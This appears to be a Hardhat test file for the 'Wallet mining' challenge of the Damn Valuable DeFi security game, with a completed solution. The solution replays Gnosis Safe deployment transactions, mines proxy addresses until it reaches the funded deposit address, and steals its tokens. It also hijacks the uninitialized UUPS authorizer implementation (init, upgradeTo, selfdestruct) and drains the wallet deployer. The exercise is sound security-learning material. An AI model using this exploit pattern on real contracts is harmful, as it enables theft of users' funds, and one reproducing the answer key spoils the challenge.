const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { FACTORY_TX, MASTERCOPY_TX, SET_IMPL_TX } = require('./tx_data');
const { getImplementationAddress } = require('@openzeppelin/upgrades-core');


describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // send some ether to the Safe: Deployer 3
        let safe_deployer = '0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A';
        await player.sendTransaction(
            {to: safe_deployer, value: ethers.utils.parseEther("1")}
        );

        // Emulate first 3 transactions from Safe: Deployer 3
        await (await ethers.provider.sendTransaction(
            MASTERCOPY_TX
        )).wait();

        await (await ethers.provider.sendTransaction(
            SET_IMPL_TX
        )).wait();

        await (await ethers.provider.sendTransaction(
            FACTORY_TX
        )).wait();

        const factory = await (await ethers.getContractFactory("GnosisSafeProxyFactory", deployer))
            .attach(await walletDeployer.fact());
        const mastercopy = await (await ethers.getContractFactory("GnosisSafe", deployer))
            .attach(await walletDeployer.copy());
        
        // Create Gonsis Proxies until get 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
        let attacker_proxy;
        let attacker = await (await ethers.getContractFactory("AttackerWalletMining", deployer))
            .deploy(authorizer.address, walletDeployer.address, token.address);
        for (let i = 0; i < 99; i++) {
            attacker_proxy = await factory.createProxy(attacker.address, "0x");
            attacker_proxy = ethers.utils.defaultAbiCoder.decode([ "address" ], (await attacker_proxy.wait()).logs[0].data)[0].toLowerCase();
            if (attacker_proxy == DEPOSIT_ADDRESS) {
                break;
            }
        }

        // Steal funds
        attacker_proxy = await (await ethers.getContractFactory("AttackerWalletMining", deployer))
            .attach(attacker_proxy);
        await attacker_proxy.connect(player).steal(token.address);


        // call init, upgradeTo and selfdestruct
        const impl_address = await getImplementationAddress(ethers.provider, authorizer.address);
        await attacker.connect(player).attack(impl_address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).not.to.be.reverted;

        for (var i = 0; i < 43; i++) {
            await walletDeployer.connect(player).drop("0x");
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
